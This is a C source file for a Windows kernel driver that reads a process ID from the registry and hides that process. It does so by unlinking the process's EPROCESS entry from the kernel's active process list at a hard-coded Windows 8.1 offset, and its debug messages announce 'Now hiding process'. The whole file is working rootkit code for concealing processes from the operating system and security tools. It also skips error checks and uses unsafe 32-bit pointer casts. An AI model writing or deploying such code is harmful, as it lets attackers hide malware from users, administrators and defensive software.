/*++

Module Name:

    driver.c

Abstract:

    This file contains the driver entry points and callbacks.

Environment:

    Kernel-mode Driver Framework

--*/

#include "driver.h"
#include "wdm.h"





NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);

VOID HideProc_Unload(PDRIVER_OBJECT  DriverObject);



NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(IN ULONG ProcessId, OUT PEPROCESS *Process);



NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath){

	ULONG dwEProcAddr;
	PLIST_ENTRY pListProcs;
	PEPROCESS pEProc;
	//HANDLE hKey;
	//OBJECT_ATTRIBUTES key;
	//UNICODE_STRING us;
	//UNICODE_STRING vkey;
	//RtlInitUnicodeString(&us, L"\\Registry\\User\\Software\\Microsoft\\Windows");
	//RtlInitUnicodeString(&vkey, L"PID");

	//
	//InitializeObjectAttributes(&key, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
	//ZwOpenKey(&hKey, KEY_READ, &key);
	//ZwQueryValueKey(hKey,&vkey,KeyValueFullInformation,
	//

	NTSTATUS           status = NULL;
	UNICODE_STRING     RegistryKeyName;
	OBJECT_ATTRIBUTES  ObjectAttributes;
	HANDLE handleRegKey;

	RtlInitUnicodeString(&RegistryKeyName, L"\\Registry\\Machine\\Software\\");
	InitializeObjectAttributes(&ObjectAttributes,
		&RegistryKeyName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,    // handle
		NULL);
	status = ZwOpenKey(&handleRegKey, KEY_READ, &ObjectAttributes);

	
	// The driver obtained the registry key.
	PKEY_VALUE_FULL_INFORMATION  pKeyInfo = NULL;
	UNICODE_STRING               ValueName;
	ULONG                        ulKeyInfoSize = 0;
	ULONG                        ulKeyInfoSizeNeeded = 0;
	ULONG g_ulTag = 1337;
	// The driver requires the following value.
	RtlInitUnicodeString(&ValueName, L"PID");

	// Determine the required size of keyInfo.
	status = ZwQueryValueKey(handleRegKey,
		&ValueName,
		KeyValueFullInformation,
		pKeyInfo,
		ulKeyInfoSize,
		&ulKeyInfoSizeNeeded);

		// Allocate the memory required for the key.
		ulKeyInfoSize = ulKeyInfoSizeNeeded;
		pKeyInfo = (PKEY_VALUE_FULL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, ulKeyInfoSizeNeeded, g_ulTag);
	
		RtlZeroMemory(pKeyInfo, ulKeyInfoSize);

		// Get the key data.
		status = ZwQueryValueKey(handleRegKey,
			&ValueName,
			KeyValueFullInformation,
			pKeyInfo,
			ulKeyInfoSize,
			&ulKeyInfoSizeNeeded);
	


			ULONG_PTR   pSrc = NULL;
			int x;
			typedef unsigned char BYTE;   // 8-bit unsigned entity.
			typedef BYTE *        PBYTE;  // Pointer to BYTE.

			pSrc = (ULONG_PTR)((PBYTE)pKeyInfo + pKeyInfo->DataOffset);

		

			// Copy the frame path.
			RtlCopyMemory(&x, (PVOID)pSrc, 4);

			DbgPrint("%d", x);

	PsLookupProcessByProcessId(x, &pEProc);
					DbgPrint("EPROCESS found. Address: %08lX.\n", pEProc);
					DbgPrint("Now hiding process %d...\n", x);
					dwEProcAddr = (ULONG)pEProc;
					
						pListProcs = (PLIST_ENTRY)(dwEProcAddr + 0x0b8);// Win 8.1
						*((ULONG*)pListProcs->Blink) = (ULONG)(pListProcs->Flink);   //set flink of prev proc to flink of cur proc
						*((ULONG*)pListProcs->Flink + 1) = (ULONG)(pListProcs->Blink); //set blink of next proc to blink of cur proc
						pListProcs->Flink = (PLIST_ENTRY)&(pListProcs->Flink); //set flink and blink of cur proc to themselves
						pListProcs->Blink = (PLIST_ENTRY)&(pListProcs->Flink); //otherwise might bsod when exiting process
						DbgPrint("Process now hidden.\n");
				
		pDriverObject->DriverUnload = HideProc_Unload;

	return STATUS_SUCCESS;
}


VOID HideProc_Unload(PDRIVER_OBJECT  DriverObject){

}
